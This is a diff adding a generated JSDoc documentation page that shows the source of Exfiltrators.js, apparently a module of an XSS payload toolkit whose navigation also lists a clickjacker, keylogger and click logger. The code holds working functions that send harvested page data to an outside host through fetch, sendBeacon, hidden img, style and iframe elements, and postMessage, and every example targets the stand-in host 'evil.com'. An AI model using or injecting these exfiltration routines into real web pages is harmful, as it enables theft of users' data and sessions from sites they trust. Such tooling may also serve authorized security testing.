@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Exfiltrators.js - Documentation</title>
+
+    <script src="scripts/prettify/prettify.js"></script>
+    <script src="scripts/prettify/lang-css.js"></script>
+    <script src="scripts/graphs.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <link type="text/css" rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/graph.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+<body>
+
+<input type="checkbox" id="nav-trigger" class="nav-trigger" />
+<label for="nav-trigger" class="navicon-button x">
+  <div class="navicon"></div>
+</label>
+
+<label for="nav-trigger" class="overlay"></label>
+
+<nav class="nav">
+    <h2><a href="index.html">Home</a></h2><h3>Modules</h3><ul><li><a href="module-utils.html">utils</a><ul class='methods'><li data-type='method'><a href="module-utils.html#.buildUrl">buildUrl</a></li><li data-type='method'><a href="module-utils.html#.createElement">createElement</a></li><li data-type='method'><a href="module-utils.html#.createFrame">createFrame</a></li><li data-type='method'><a href="module-utils.html#.loadUglify">loadUglify</a></li><li data-type='method'><a href="module-utils.html#.randInt">randInt</a></li></ul></li></ul><h3>Classes</h3><ul><li><a href="ClickJacker.html">ClickJacker</a><ul class='methods'><li data-type='method'><a href="ClickJacker.html#addStep">addStep</a></li><li data-type='method'><a href="ClickJacker.html#run">run</a></li></ul></li><li><a href="Exfiltrators.html">Exfiltrators</a><ul class='methods'><li data-type='method'><a href="Exfiltrators.html#.console">console</a></li><li data-type='method'><a href="Exfiltrators.html#.get">get</a></li><li data-type='method'><a href="Exfiltrators.html#.iframe">iframe</a></li><li data-type='method'><a href="Exfiltrators.html#.img">img</a></li><li data-type='method'><a href="Exfiltrators.html#.message">message</a></li><li data-type='method'><a href="Exfiltrators.html#.post">post</a></li><li data-type='method'><a href="Exfiltrators.html#.postJSON">postJSON</a></li><li data-type='method'><a href="Exfiltrators.html#.sendBeacon">sendBeacon</a></li><li data-type='method'><a href="Exfiltrators.html#.style">style</a></li></ul></li><li><a href="MessageHandler.html">MessageHandler</a><ul class='methods'><li data-type='method'><a href="MessageHandler.html#addListener">addListener</a></li><li data-type='method'><a href="MessageHandler.html#listen">listen</a></li><li data-type='method'><a href="MessageHandler.html#logMessages">logMessages</a></li><li data-type='method'><a href="MessageHandler.html#removeListener">removeListener</a></li><li data-type='method'><a href="MessageHandler.html#stop">stop</a></li><li data-type='method'><a href="MessageHandler.html#waitForMessage">waitForMessage</a></li></ul></li><li><a href="Payload.html">Payload</a><ul class='methods'><li data-type='method'><a href="Payload.html#.new">new</a></li><li data-type='method'><a href="Payload.html#addExfiltrator">addExfiltrator</a></li><li data-type='method'><a href="Payload.html#asDOM">asDOM</a></li><li data-type='method'><a href="Payload.html#eval">eval</a></li><li data-type='method'><a href="Payload.html#exfiltrate">exfiltrate</a></li><li data-type='method'><a href="Payload.html#fetch">fetch</a></li><li data-type='method'><a href="Payload.html#fetchDOM">fetchDOM</a></li><li data-type='method'><a href="Payload.html#fetchJSON">fetchJSON</a></li><li data-type='method'><a href="Payload.html#fetchText">fetchText</a></li><li data-type='method'><a href="Payload.html#findBetween">findBetween</a></li><li data-type='method'><a href="Payload.html#forEach">forEach</a></li><li data-type='method'><a href="Payload.html#guard">guard</a></li><li data-type='method'><a href="Payload.html#injectStyle">injectStyle</a></li><li data-type='method'><a href="Payload.html#log">log</a></li><li data-type='method'><a href="Payload.html#map">map</a></li><li data-type='method'><a href="Payload.html#parallel">parallel</a></li><li data-type='method'><a href="Payload.html#passthru">passthru</a></li><li data-type='method'><a href="Payload.html#persist">persist</a></li><li data-type='method'><a href="Payload.html#postMessage">postMessage</a></li><li data-type='method'><a href="Payload.html#postMultipart">postMultipart</a></li><li data-type='method'><a href="Payload.html#querySelector">querySelector</a></li><li data-type='method'><a href="Payload.html#querySelectorAll">querySelectorAll</a></li><li data-type='method'><a href="Payload.html#redirect">redirect</a></li><li data-type='method'><a href="Payload.html#regExtract">regExtract</a></li><li data-type='method'><a href="Payload.html#setExfiltrator">setExfiltrator</a></li><li data-type='method'><a href="Payload.html#startClickLogger">startClickLogger</a></li><li data-type='method'><a href="Payload.html#startKeyLogger">startKeyLogger</a></li><li data-type='method'><a href="Payload.html#wait">wait</a></li></ul></li><li><a href="Wrapper.html">Wrapper</a><ul class='methods'><li data-type='method'><a href="Wrapper.html#.new">new</a></li><li data-type='method'><a href="Wrapper.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_HTML.html">Wrapper_HTML</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTML.html#append">append</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_HTML.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_HTML.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTML.html#innerHTML">innerHTML</a></li><li data-type='method'><a href="Wrapper_HTML.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_HTML.html#wrap">wrap</a></li><li data-type='method'><a href="Wrapper_HTML.html#write">write</a></li></ul></li><li><a href="Wrapper_HTMLDataUrl.html">Wrapper_HTMLDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#windowOpen">windowOpen</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JS.html">Wrapper_JS</a><ul class='methods'><li data-type='method'><a href="Wrapper_JS.html#append">append</a></li><li data-type='method'><a href="Wrapper_JS.html#appendScript">appendScript</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_JS.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_JS.html#evalB64">evalB64</a></li><li data-type='method'><a href="Wrapper_JS.html#evalStringForCharCode">evalStringForCharCode</a></li><li data-type='method'><a href="Wrapper_JS.html#imgError">imgError</a></li><li data-type='method'><a href="Wrapper_JS.html#inputFocus">inputFocus</a></li><li data-type='method'><a href="Wrapper_JS.html#minify">minify</a></li><li data-type='method'><a href="Wrapper_JS.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_JS.html#script">script</a></li><li data-type='method'><a href="Wrapper_JS.html#svgLoad">svgLoad</a></li><li data-type='method'><a href="Wrapper_JS.html#templateString">templateString</a></li><li data-type='method'><a href="Wrapper_JS.html#url">url</a></li><li data-type='method'><a href="Wrapper_JS.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSDataUrl.html">Wrapper_JSDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSDataUrl.html#script">script</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#scriptImport">scriptImport</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSUrl.html">Wrapper_JSUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSUrl.html#embed">embed</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#object">object</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#redirect">redirect</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#wrap">wrap</a></li></ul></li></ul>
+</nav>
+
+<div id="main">
+    
+    <h1 class="page-title">Exfiltrators.js</h1>
+    
+
+    <!--container.tmpl-->
+
+
+
+
+    <!--source.tmpl-->
+
+    <section>
+        <article>
+            <pre class="prettyprint source linenums"><code>
+
+import Payload from "./Payload.js"
+
+/**
+ * Add a get parameter name to an existing url
+ * @param {string} url  
+ * @param {string} name of the parameter 
+ * @return {string} An where you can append the data to exfiltrate
+ */
+function addURLParam(url, name) {
+    return url + (url.includes("?") ? "&amp;" : "?") + name + "="
+}
+
+
+/**
+ * Collection of exfiltrators
+ * @alias Exfiltrators
+ */
+class Exfiltrators {
+    /**
+     * Create an exfiltrator using fetch with GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
+     * 
+     * @param {string} url Url to use for exfiltration 
+     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
+     * @example
+     * const exfiltrator = Exfiltrator.get("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static get(url, paramName = "data") {
+        const fetchUrl = addURLParam(url, paramName)
+        return Payload.new().eval((u, x) => fetch(u + btoa(JSON.stringify(x)), { mode: 'no-cors', cache: 'no-cache' }), fetchUrl)
+    }
+
+
+    /**
+     * Create an exfiltrator using fetch with POST request, the data is stringified as JSON before exfiltration.  
+     * 
+     * @param {string} url Url to use for exfiltration 
+     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
+     * @example
+     * const exfiltrator = Exfiltrator.post("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static post(url, paramName = "data") {
+        return Payload.new((u, n, x) => fetch(u, { mode: 'no-cors', method: 'POST', body: { [n]: JSON.stringify(x) } }), url, paramName)
+    }
+
+
+    /**
+     * Create an exfiltrator using fetch with POST JSON request, the data is stringified as JSON before exfiltration.  &lt;br>
+     * &lt;br>
+     * Since it's not possible to set the content-type as application/json for cross domain requests, the content-type is set as text/plain. 
+     * @param {string} url Url to use for exfiltration 
+     * @example
+     * const exfiltrator = Exfiltrator.postJSON("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static postJSON(url) {
+        return Payload.new().eval((u, x) => fetch(u, { mode: 'no-cors', method: 'POST', body: JSON.stringify(x) }), url)
+    }
+
+
+    /**
+     * Create an exfiltrator using navigator.sendBeacon, the data is stringified as JSON before exfiltration. &lt;br>
+     * @param {string} url Url to use for exfiltration 
+     * @example
+     * const exfiltrator = Exfiltrator.sendBeacon("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static sendBeacon(url) {
+        return Payload.new().eval((u, x) => navigator.sendBeacon(u, JSON.stringify(x)), url)
+    }
+
+
+    /**
+     * Create a debugging exfiltrator that log to the console.&lt;br>
+     * @param {string} [prefix=null] Prefix to add to console.log call
+     * @example
+     * const exfiltrator = Exfiltrator.console()
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static console(prefix = null) {
+        if (prefix !== null) {
+            return Payload.new().eval((p, x) => console.log(p, x), prefix)
+        } else {
+            return Payload.new().log()
+        }
+    }
+
+
+    /**
+     * Create an exfiltrator using &amp;lt;img&amp;gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
+     * 
+     * @param {string} url Url to use for exfiltration 
+     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
+     * @example
+     * const exfiltrator = Exfiltrator.img("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static img(url, paramName = "data") {
+        const imgUrl = addURLParam(url, paramName)
+        return Payload.new().eval((u, x) => {
+            const i = document.createElement('img');
+            i.src = u + btoa(JSON.stringify(x));
+            i.hidden = true;
+            document.body.appendChild(i)
+        }, imgUrl)
+    }
+
+
+    /**
+     * Create an exfiltrator using &amp;lt;style&amp;gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
+     * 
+     * @param {string} url Url to use for exfiltration 
+     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
+     * @example
+     * const exfiltrator = Exfiltrator.style("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static style(url, paramName = "data") {
+        const styleUrl = addURLParam(url, paramName)
+        return Payload.new().eval((u, x) => {
+            const s = document.createElement('style');
+            s.src = u + btoa(JSON.stringify(x));
+            s.hidden = true;
+            document.body.appendChild(s)
+        }, styleUrl)
+    }
+
+
+    /**
+     * Create an exfiltrator using &amp;lt;iframe&amp;gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
+     * 
+     * @param {string} url Url to use for exfiltration 
+     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
+     * @example
+     * const exfiltrator = Exfiltrator.iframe("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static iframe(url, paramName = "data") {
+        const frameUrl = addURLParam(url, paramName)
+        return Payload.new().eval((u, x) => {
+            const i = document.createElement('iframe');
+            i.src = u + btoa(JSON.stringify(x));
+            i.hidden = true;
+            document.body.appendChild(i)
+        }, frameUrl)
+    }
+
+
+    /**
+     * Create an exfiltrator using window.postMessage, the data is stringified as JSON before exfiltration.  
+     * 
+     * @param {string} [name="top"] Name of the targeted frame 
+     * @param {string} [target="*"] Target for the message
+     * @example
+     * const exfiltrator = Exfiltrator.img("http://evil.com")
+     * const p = Payload.new()
+     *               .setExfiltrator(exfiltrator)
+     *               .fetchJSON("/")
+     *               .exfiltrate()
+     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
+     */
+    static message(frame = "top", target = "*") {
+        return Payload.new().eval((frame, target, x) => window.frames[frame].postMessage(JSON.stringify(x), target), frame, target)
+    }
+}
+
+export default Exfiltrators;</code></pre>
+        </article>
+    </section>
+
+
+
+
+
+</div>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.6.6</a> on Sun Mar 14 2021 13:45:10 GMT+0100 (Central European Standard Time) using the LOKE theme.
+</footer>
+
+<script>prettyPrint();</script>
+<script src="scripts/linenumber.js"></script>
+<script>window.addEventListener("DOMContentLoaded", initGraphs)</script>
+</body>
+</html>
